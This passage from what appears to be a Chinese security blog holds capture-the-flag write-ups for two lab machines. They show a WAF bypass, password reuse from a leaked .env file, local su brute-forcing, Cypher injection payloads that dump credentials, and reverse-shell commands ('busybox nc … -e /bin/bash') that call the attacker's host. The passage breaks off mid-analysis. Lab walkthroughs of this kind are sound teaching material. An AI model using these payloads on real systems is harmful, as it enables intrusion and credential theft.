class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_USER=safeline-ce</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_PASSWORD=$&#123;POSTGRES_PASSWORD:?postgres</span> <span class="string">password</span> <span class="string">required&#125;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.2</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">postgres</span>, <span class="string">-c</span>, <span class="string">max_connections=600</span>]</span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> <span class="string">pg_isready</span> <span class="string">-U</span> <span class="string">safeline-ce</span> <span class="string">-d</span> <span class="string">safeline-ce</span></span><br><span class="line">  <span class="attr">mgt:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-mgt</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-mgt$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG:?image</span> <span class="string">tag</span> <span class="string">required&#125;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/mgt:/app/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/logs/nginx:/app/log/nginx:z</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/sock:/app/sock</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run:/app/run</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;MGT_PORT:-9443&#125;:1443</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> <span class="string">curl</span> <span class="string">-k</span> <span class="string">-f</span> <span class="string">https://localhost:1443/api/open/health</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MGT_PG=postgres://safeline-ce:$&#123;POSTGRES_PASSWORD&#125;@safeline-pg/safeline-ce?sslmode=disable</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">fvm</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">&quot;5&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.4</span></span><br><span class="line">  <span class="attr">detect:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-detector</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-detector$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/detector:/resources/detector</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/logs/detector:/logs/detector</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">LOG_DIR=/logs/detector</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.5</span></span><br><span class="line">  <span class="attr">tengine:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-tengine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-tengine$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/resolv.conf:/etc/resolv.conf:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/nginx:/etc/nginx</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/detector:/resources/detector</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/chaos:/resources/chaos</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/logs/nginx:/var/log/nginx:z</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/cache:/usr/local/nginx/cache</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/sock:/app/sock</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TCD_MGT_API=https://$&#123;SUBNET_PREFIX&#125;.4:1443/api/open/publish/server</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TCD_SNSERVER=$&#123;SUBNET_PREFIX&#125;.5:8000</span></span><br><span class="line">      <span class="comment"># deprecated</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SNSERVER_ADDR=$&#123;SUBNET_PREFIX&#125;.5:8000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CHAOS_ADDR=$&#123;SUBNET_PREFIX&#125;.10</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nofile:</span> <span class="number">131072</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">host</span></span><br><span class="line">  <span class="attr">luigi:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-luigi</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-luigi$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MGT_IP=$&#123;SUBNET_PREFIX&#125;.4</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">LUIGI_PG=postgres://safeline-ce:$&#123;POSTGRES_PASSWORD&#125;@safeline-pg/safeline-ce?sslmode=disable</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/luigi:/app/data</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">&quot;5&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">detect</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mgt</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.7</span></span><br><span class="line">  <span class="attr">fvm:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-fvm</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-fvm$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">&quot;5&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.8</span></span><br><span class="line">  <span class="attr">chaos:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-chaos</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-chaos$&#123;REGION&#125;$&#123;ARCH_SUFFIX&#125;:$&#123;IMAGE_TAG&#125;</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">&quot;10&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_ADDR=postgres://safeline-ce:$&#123;POSTGRES_PASSWORD&#125;@safeline-pg/safeline-ce?sslmode=disable</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/sock:/app/sock</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/chaos:/app/chaos</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">safeline-ce:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.10</span></span><br></pre></td></tr></table></figure>

<p>看上去是个 <code>safeline</code> 的 docker 配置文件，里面有个很重要的变量就是 <code>POSTGRES_PASSWORD</code>，因为它是个密码，找到之后我们可能可以进 <strong>PostgreSQL</strong> 里面找找信息，也可能存在密码复用的问题。</p>
<p>而这种 <code>$&#123;POSTGRES_PASSWORD&#125;</code> 形式的变量，一般要么在系统环境变量里面，要么在本地的 <code>.env</code> 文件里面。</p>
<p>查看本地文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/data/safeline$ <span class="built_in">ls</span> -liah</span><br><span class="line"><span class="built_in">ls</span> -liah</span><br><span class="line">total 28K</span><br><span class="line">1438978 drwxr-xr-x  4 root root 4.0K Aug 12 02:09 .</span><br><span class="line">1438977 drwxr-xr-x  3 root root 4.0K Aug 12 02:08 ..</span><br><span class="line">1438993 -rw-r--r--  1 root root  222 Aug 12 02:09 .<span class="built_in">env</span></span><br><span class="line">1438992 -rw-r--r--  1 root root 4.5K Aug 12 02:08 docker-compose.yaml</span><br><span class="line">1438983 drwxr-xr-x  4 root root 4.0K Aug 12 02:08 logs</span><br><span class="line">1438979 drwxr-xr-x 10 root root 4.0K Aug 12 02:08 resources</span><br><span class="line">www-data@Cloud:/data/safeline$</span><br></pre></td></tr></table></figure>

<p>有个 <code>.env</code> ，查看一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/data/safeline$ <span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line"><span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line">SAFELINE_DIR=/data/safeline</span><br><span class="line">POSTGRES_PASSWORD=vivrdIDj6fhNJIRdnitL</span><br><span class="line">MGT_PORT=9443</span><br><span class="line">RELEASE=</span><br><span class="line">CHANNEL=</span><br><span class="line">REGION=</span><br><span class="line">IMAGE_PREFIX=swr.cn-east-3.myhuaweicloud.com/chaitin-safeline</span><br><span class="line">IMAGE_TAG=9.2.1</span><br><span class="line">SUBNET_PREFIX=192.168.0</span><br><span class="line">ARCH_SUFFIX=</span><br><span class="line">www-data@Cloud:/data/safeline$</span><br></pre></td></tr></table></figure>

<p>果然有个 <strong>POSTGRES_PASSWORD</strong> ，可能就是 lucky 用户的密码，尝试登录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/data/safeline$ su lucky </span><br><span class="line">su lucky </span><br><span class="line">Password: vivrdIDj6fhNJIRdnitL</span><br><span class="line"></span><br><span class="line">lucky@Cloud:/data/safeline$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">lucky</span><br><span class="line">lucky@Cloud:/data/safeline$</span><br></pre></td></tr></table></figure>

<p>切换到了 lucky 用户，现在可以去看刚才的 <code>.hint</code> 了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucky@Cloud:~$ <span class="built_in">ls</span> -liah</span><br><span class="line"><span class="built_in">ls</span> -liah</span><br><span class="line">total 28K</span><br><span class="line">527366 drwxr-xr-x 2 lucky lucky 4.0K Aug 12 06:04 .</span><br><span class="line">523265 drwxr-xr-x 3 root  root  4.0K Aug 12 03:38 ..</span><br><span class="line">527367 -rw-r--r-- 1 lucky lucky  220 Aug 12 03:38 .bash_logout</span><br><span class="line">527368 -rw-r--r-- 1 lucky lucky 3.5K Aug 12 03:38 .bashrc</span><br><span class="line">530672 -rw------- 1 lucky lucky   45 Aug 12 06:04 .hint</span><br><span class="line">527369 -rw-r--r-- 1 lucky lucky  807 Aug 12 03:38 .profile</span><br><span class="line">530667 -rw-r--r-- 1 root  root    44 Aug 12 03:38 user.txt</span><br><span class="line">lucky@Cloud:~$ <span class="built_in">cat</span> .hint</span><br><span class="line"><span class="built_in">cat</span> .hint</span><br><span class="line">root password length is 4.</span><br><span class="line">Regex is : <span class="string">&#x27;r..o&#x27;</span></span><br><span class="line">lucky@Cloud:~$ </span><br></pre></td></tr></table></figure>

<p>他说 <code>root</code> 的密码是 4 个字符，并且形式是 <code>r..o</code> ，可能中间是小写字母或者数字之类的，那就先用这个规则生成一个字典，如果不够，再生成加上大写字母和符号的字典就好了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import itertools,string; print(&#x27;\n&#x27;.join([&#x27;r&#x27;+a+b+&#x27;o&#x27; for a,b in itertools.product(string.ascii_lowercase+string.digits, repeat=2)]))&quot;</span> &gt; dict.txt</span><br></pre></td></tr></table></figure>

<p>然后，我们需要传入 <code>suForce</code> 这个本地爆破 ssh 登录的工具来爆破 root 的密码。</p>
<p>suForce 的使用有一点可以注意一下，可以自己手动改一改源脚本里的 <code>timeout</code> 的值，默认为 0.1 ，但我没改，跑了两次都没出，最后改成 0.5 就成功了。</p>
<p>suForce 的下载地址为 <a href="https://github.com/d4t4s3c/suForce">(https://github.com/d4t4s3c/suForce)</a></p>
<p>下载到宿主机之后，可以用 nc 来传入到靶机，也可以用 python3 开个 http.server ，再在靶机里面用 wget 传入。</p>
<p>传入到靶机之后，用如下的命令进行 root 密码的爆破：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucky@Cloud:~$ ./suForce -u root -w dict.txt </span><br><span class="line">            _____                        </span><br><span class="line"> ___ _   _ |  ___|__  _ __ ___ ___   </span><br><span class="line">/ __| | | || |_ / _ \| <span class="string">&#x27;__/ __/ _ \ </span></span><br><span class="line"><span class="string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span></span><br><span class="line"><span class="string">|___/\__,_||_|  \___/|_|  \___\___|  </span></span><br><span class="line"><span class="string">-=================================-                                   </span></span><br><span class="line"><span class="string">[*] Username: root</span></span><br><span class="line"><span class="string">[*] Wordlist: dict.txt</span></span><br><span class="line"><span class="string">[i] Status</span></span><br><span class="line"><span class="string">    519/1296/40%/rooo                              </span></span><br><span class="line"><span class="string">[+] Password: rooo Line: 519</span></span><br><span class="line"><span class="string">-=================================-</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lucky@Cloud:~$</span></span><br></pre></td></tr></table></figure>

<p>爆破出 root 的密码为： <code>rooo</code> ，登录，拿 root flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucky@Cloud:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@Cloud:/home/lucky# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@Cloud:/home/lucky# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;root-74cc1c60799e0a786ac7094b532f01b1&#125;</span><br><span class="line">root@Cloud:/home/lucky#</span><br></pre></td></tr></table></figure>

<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>在 <strong>web 渗透</strong> 阶段，我由于第一次靶机开机好像有点问题，然后就重开了一次，偶然间发现，靶机重开之后的大概半分钟内，雷池 WAF 是还没有接管 80 端口的，因此 80 端口此时还能正常访问到。</p>
<p>因此，如果我们提前把命令执行的 <code>curl</code> 内容给写好，就可以在靶机开启之后的短暂时间内绕过 WAF 的防护，直接进行反弹 shell 了。</p>
<p>大概就是，重开靶机，然后进行 curl 访问：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ curl <span class="string">&#x27;http://cloud.dsz/system.php?action=custom&amp;command=busybox+nc+192.168.43.68+1234+-e+%2Fbin%2Fbash&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后也是可以接收到反弹 shell 的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.43.154 34810</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>这可能是因为雷池 WAF 的部署是个 docker，靶机开机之后，docker 成功启动还需要一定的时间，但是 80 端口的 web 服务已经启动了，因此我们可以直接访问到 80 端口。</p>
]]></content>
      <tags>
        <tag>Maze-Sec</tag>
        <tag>SafeLine WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>MazeSec-Mayuri</title>
    <url>/2025/08/12/MazeSec-Mayuri/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/mayuri]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 192.168.0.103                                                                                                            </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 13:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.103</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 4A:94:24:32:EC:CF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.38 seconds</span><br></pre></td></tr></table></figure>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>开了80端口和8080端口，先访问一下80端口：</p>
<p><img src="image1.png" alt="image1"></p>
<p>说是要输入查询编号查询什么东西，看到“查询”两个字就想到可能会有注入，那就先来个引号试一下：</p>
<p><img src="image2.png" alt="image2"></p>
<p>果然报错了，但是报错的内容有点奇怪，有些问号，把这玩意扔给GPT问一下。</p>
<p>GPT说这看起来像是 <strong>Neo4j Cypher</strong> 查询语句，正常的形式可能是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;MATCH (n:shop) WHERE n.sid = &#x27; + sid + &#x27; RETURN n;&#x27;</span><br></pre></td></tr></table></figure>

<p>这个报错看上去sid是直接拼接在查询语句中的，sid我们可控，因此可能存在注入。</p>
<p>先看看8080端口是什么：</p>
<p><img src="image5.png" alt="image5"></p>
<p>8080端口是个登录页面，那可能就是要从80端口注入拿到账号密码，然后从8080端口进行登录。</p>
<p>回到80端口，学习一下cypher的基本语法，并且发现cypher的注释符号是 <strong>&#x2F;&#x2F;</strong> ，那就可以用 “1 return n;&#x2F;&#x2F;” 和 “1’ return n;&#x2F;&#x2F;” 来试试是否存在注入：</p>
<p><img src="image3.png" alt="image3"></p>
<p><img src="image4.png" alt="image4"></p>
<p>可以看到，<strong>1 return n;&#x2F;&#x2F;</strong> 可以正常返回查询sid为1的数据，说明存在数值类的注入。</p>
<p>根据这篇文章<a href="https://blog.csdn.net/Che_ng/article/details/145965471">(https://blog.csdn.net/Che_ng&#x2F;article&#x2F;details&#x2F;145965471)</a>学习了一下cypher的语法，构造出了如下的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 return 1 as n union call db.labels() yield label as n return n;//</span><br></pre></td></tr></table></figure>

<p>这个payload可以查询存在的所有标签，查看结果：</p>
<p><img src="image6.png" alt="image6"></p>
<p>发现有 <strong>User</strong> ，那就 <em>union</em> 继续拼接查询User的内容，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 return n union match(n:User) return n;//</span><br></pre></td></tr></table></figure>

<p><img src="image7.png" alt="image7"></p>
<p>看到 <em>username</em> 为 <code>Okabe</code> , <em>password</em> 为 <code>OOOkkkaaabbbeee</code> ，拿去8080端口登录：</p>
<p><img src="image8.png" alt="image8"></p>
<p>进去之后有个终端，尝试 <code>ls</code> :</p>
<p><img src="image9.png" alt="image9"></p>
<p>是个可以执行命令的终端，那就进行反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">busybox nc 192.168.0.104 1234 -e /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/mayuri]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.0.102 48486</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www-data@Mayuri:/var/www/website-b$ </span><br></pre></td></tr></table></figure>

<p>在home里面，有个kyoma用户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ww-data@Mayuri:/var/www/website-b$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">www-data@Mayuri:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">kyoma</span><br><span class="line">www-data@Mayuri:/home$</span><br></pre></td></tr></table></figure>

<p>能够进入kyoma的家目录，不能执行 <code>ls</code> ，但是可以看user flag:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home$ <span class="built_in">cd</span> kyoma</span><br><span class="line"><span class="built_in">cd</span> kyoma</span><br><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">flag&#123;1.055821%&#125;</span><br><span class="line">www-data@Mayuri:/home/kyoma$ </span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在机器里面寻找一些信息，在环境变量里面发现了一个密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">env</span></span><br><span class="line"><span class="built_in">env</span></span><br><span class="line">Pass=1.129848</span><br><span class="line">PWD=/home/kyoma</span><br><span class="line">APACHE_LOG_DIR=/var/log/apache2</span><br><span class="line">LANG=C</span><br><span class="line">INVOCATION_ID=0e54d57f5e424abfa9aecdf373228dd1</span><br><span class="line">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span><br><span class="line">APACHE_RUN_GROUP=www-data</span><br><span class="line">APACHE_LOCK_DIR=/var/lock/apache2</span><br><span class="line">SHLVL=2</span><br><span class="line">LC_CTYPE=C.UTF-8</span><br><span class="line">APACHE_RUN_DIR=/var/run/apache2</span><br><span class="line">JOURNAL_STREAM=9:13641</span><br><span class="line">APACHE_RUN_USER=www-data</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">OLDPWD=/home</span><br><span class="line">www-data@Mayuri:/home/kyoma$</span><br></pre></td></tr></table></figure>

<p>猜测是kyoma的密码，登录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home/kyoma$ su kyoma</span><br><span class="line">su kyoma</span><br><span class="line">Password: 1.129848</span><br><span class="line"></span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">kyoma</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>在kyoma的家目录里面有一些文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">a.out  Mail  TimeMachine  user.txt</span><br><span class="line">kyoma@Mayuri:~$</span><br></pre></td></tr></table></figure>

<p>有个Mail，查看内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From: Okabe Rintarou &lt;phoenix.h@futuregadgetlab.net&gt;</span><br><span class="line">To: Okabe Rintarou &lt;o.rintarou@futuregadgetlab.net&gt;</span><br><span class="line">Subject: A Message to My Past Self</span><br><span class="line">Date: Mon, 15 Jul 2036 14:30:00 +0900</span><br><span class="line">Message-ID: &lt;f74c7678f9e61287e0719e59d9a10369@d-rine.sern.net&gt;</span><br><span class="line">X-Mailer: D-RINE (Amadeus Custom Build) v2.10</span><br><span class="line">X-Received-At: 2011-08-21 18:45:00 JST</span><br><span class="line"></span><br><span class="line">“看着吧，过去的我。”</span><br><span class="line">“世界是可以被欺骗的。”</span><br><span class="line">“将所有的可能性连接起来。”</span><br><span class="line">“欺骗世界，欺骗所有的时间轴观测者。”</span><br><span class="line">“这才是‘掌管未来的女神行动’。”</span><br><span class="line">“在那前方，有你的…”</span><br><span class="line">“你不是一个人。”</span><br><span class="line">“凤凰院凶真欺骗了世界。你也能做到。”</span><br><span class="line">“首先，你先需要通过时间机器拿到权限。”</span><br><span class="line">“El. Psy. Kongroo.”</span><br></pre></td></tr></table></figure>

<p>他说 <strong>“你先需要通过时间机器拿到权限”</strong> ，我们现在是kyoba，那要拿的权限就应该是root权限了。</p>
<p>说的时间机器应该就是家目录里的 <strong>TimeMachine</strong>，该文件信息如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ file TimeMachine</span><br><span class="line">file TimeMachine</span><br><span class="line">TimeMachine: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e7dd04e54e42aa78b9d552e1822b91d8c29f7004, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span> -liah TimeMachine</span><br><span class="line"><span class="built_in">ls</span> -liah TimeMachine</span><br><span class="line">527418 -rwsr-xr-x 1 root root 17K Aug  6 07:35 TimeMachine</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>是ELF文件，有suid权限，而且我们有读和执行权限，把文件拿出来，放到IDA里面查看：</p>
<p><img src="image10.png" alt="image10"></p>
<p>其中的 <em>execute_chronos_query</em> 函数内容如下：</p>
<p><img src="image11.png" alt="image11"></p>
